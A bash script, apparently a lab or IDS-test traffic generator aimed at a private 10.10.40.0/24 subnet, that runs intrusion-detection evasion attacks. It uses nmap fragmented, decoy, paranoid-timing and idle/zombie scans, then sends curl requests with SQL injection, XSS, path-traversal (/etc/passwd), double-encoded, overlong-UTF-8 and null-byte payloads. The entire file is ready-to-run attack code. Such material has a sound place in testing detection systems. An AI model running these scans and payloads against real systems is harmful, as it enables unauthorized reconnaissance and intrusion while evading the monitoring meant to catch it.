#!/bin/bash
###############################################################################
# IDS Evasion Techniques Script
# Fragmented packets, decoy scans, slow scans, encoding tricks
###############################################################################

SUBTYPE="${1:-full}"
TARGET="${2:-10.10.40.0/24}"
TARGET_PORT="${3:-*}"
RESULTS_DIR="${4:-.}"

mkdir -p "$RESULTS_DIR"

# Get single host from subnet for targeted attacks
if [[ "$TARGET" == *"/"* ]]; then
    SINGLE_TARGET="10.10.40.10"
else
    SINGLE_TARGET="$TARGET"
fi

echo "[*] Evasion techniques: $SUBTYPE against ${TARGET}"

run_frag() {
    echo "[*] Fragmented packet scans"

    # Nmap fragmented scan (-f)
    echo "[*] Single fragment scan..."
    nmap -f -sS -T3 --top-ports 100 "$SINGLE_TARGET" \
        -oN "${RESULTS_DIR}/frag_single.txt" 2>&1 || true
    sleep 5

    # Double fragmentation (-ff)
    echo "[*] Double fragment scan..."
    nmap -ff -sS -T3 --top-ports 100 "$SINGLE_TARGET" \
        -oN "${RESULTS_DIR}/frag_double.txt" 2>&1 || true
    sleep 5

    # Custom MTU
    echo "[*] Custom MTU scan (24 bytes)..."
    nmap --mtu 24 -sS -T3 --top-ports 50 "$SINGLE_TARGET" \
        -oN "${RESULTS_DIR}/frag_mtu24.txt" 2>&1 || true
    sleep 5

    # Tiny MTU
    echo "[*] Custom MTU scan (8 bytes)..."
    nmap --mtu 8 -sS -T2 --top-ports 20 "$SINGLE_TARGET" \
        -oN "${RESULTS_DIR}/frag_mtu8.txt" 2>&1 || true

    echo "[+] Fragmented scans complete"
}

run_decoy() {
    echo "[*] Decoy scans"

    # Scan with random decoys
    echo "[*] Random decoy scan (5 decoys)..."
    nmap -D RND:5 -sS -T3 --top-ports 100 "$SINGLE_TARGET" \
        -oN "${RESULTS_DIR}/decoy_random.txt" 2>&1 || true
    sleep 5

    # Scan with specific decoys (fake internal IPs)
    echo "[*] Specific decoy scan..."
    nmap -D "10.10.40.100,10.10.40.101,10.10.40.102,10.10.40.103,ME" \
        -sS -T3 --top-ports 50 "$SINGLE_TARGET" \
        -oN "${RESULTS_DIR}/decoy_specific.txt" 2>&1 || true
    sleep 5

    # Randomize host order for subnet scan
    echo "[*] Randomized host order scan..."
    nmap --randomize-hosts -sS -T3 --top-ports 20 "$TARGET" \
        -oN "${RESULTS_DIR}/decoy_random_hosts.txt" 2>&1 || true

    echo "[+] Decoy scans complete"
}

run_slow() {
    echo "[*] Ultra-slow scanning (IDS evasion)"

    # T0 (Paranoid) scan — extremely slow
    echo "[*] T0 paranoid scan (5 ports)..."
    nmap -sS -T0 -p 22,80,443,445,3306 "$SINGLE_TARGET" \
        -oN "${RESULTS_DIR}/slow_t0.txt" 2>&1 || true

    # T1 (Sneaky) with random delay
    echo "[*] T1 sneaky scan (10 ports)..."
    nmap -sS -T1 --top-ports 10 "$SINGLE_TARGET" \
        -oN "${RESULTS_DIR}/slow_t1.txt" 2>&1 || true

    # Custom scan delay
    echo "[*] Custom delay scan (2s between probes)..."
    nmap -sS --scan-delay 2s --max-retries 1 --top-ports 20 "$SINGLE_TARGET" \
        -oN "${RESULTS_DIR}/slow_custom.txt" 2>&1 || true

    # Idle/zombie scan simulation (nmap -sI)
    echo "[*] Idle scan attempt..."
    nmap -Pn -sI "10.10.40.20" --top-ports 10 "$SINGLE_TARGET" \
        -oN "${RESULTS_DIR}/slow_idle.txt" 2>&1 || true

    echo "[+] Ultra-slow scanning complete"
}

run_encoding() {
    echo "[*] Encoded payload attacks"

    # URL-encoded web attacks
    echo "[*] URL-encoded attack payloads..."
    local payloads=(
        "%27%20OR%201%3D1--"
        "%3Cscript%3Ealert(1)%3C/script%3E"
        "..%2F..%2F..%2Fetc%2Fpasswd"
        "%00/etc/passwd"
        "..%252f..%252f..%252fetc%252fpasswd"
        "%25%32%37%20OR%201=1--"
    )

    for payload in "${payloads[@]}"; do
        curl -sk "http://${SINGLE_TARGET}/${payload}" -o /dev/null 2>&1 || true
        curl -sk "http://${SINGLE_TARGET}/?id=${payload}" -o /dev/null 2>&1 || true
        sleep 1
    done

    # Double-encoded payloads
    echo "[*] Double-encoded payloads..."
    local double_encoded=(
        "%252e%252e%252f"
        "%25252e%25252e%25252f"
        "%%32%37"
    )

    for payload in "${double_encoded[@]}"; do
        curl -sk "http://${SINGLE_TARGET}/${payload}etc/passwd" -o /dev/null 2>&1 || true
        sleep 1
    done

    # Unicode/UTF-8 encoding
    echo "[*] Unicode-encoded payloads..."
    curl -sk "http://${SINGLE_TARGET}/..%c0%af..%c0%af..%c0%afetc/passwd" -o /dev/null 2>&1 || true
    curl -sk "http://${SINGLE_TARGET}/..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd" -o /dev/null 2>&1 || true
    curl -sk "http://${SINGLE_TARGET}/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd" -o /dev/null 2>&1 || true

    # Null byte injection
    echo "[*] Null byte injection..."
    curl -sk "http://${SINGLE_TARGET}/etc/passwd%00.jpg" -o /dev/null 2>&1 || true
    curl -sk "http://${SINGLE_TARGET}/?file=../../../etc/passwd%00" -o /dev/null 2>&1 || true

    # Case variation
    echo "[*] Case variation payloads..."
    curl -sk "http://${SINGLE_TARGET}/" -H "User-Agent: <ScRiPt>alert(1)</ScRiPt>" -o /dev/null 2>&1 || true
    curl -sk "http://${SINGLE_TARGET}/?id=1' UnIoN SeLeCt 1,2,3--" -o /dev/null 2>&1 || true

    echo "[+] Encoded payload attacks complete"
}

case "$SUBTYPE" in
    frag)       run_frag ;;
    decoy)      run_decoy ;;
    slow)       run_slow ;;
    encoding)   run_encoding ;;
    full)
        run_frag
        sleep 10
        run_decoy
        sleep 10
        run_encoding
        sleep 10
        run_slow
        ;;
    *)
        echo "Unknown subtype: $SUBTYPE"
        echo "Available: frag, decoy, slow, encoding, full"
        exit 1
        ;;
esac

echo "[*] Evasion script complete"
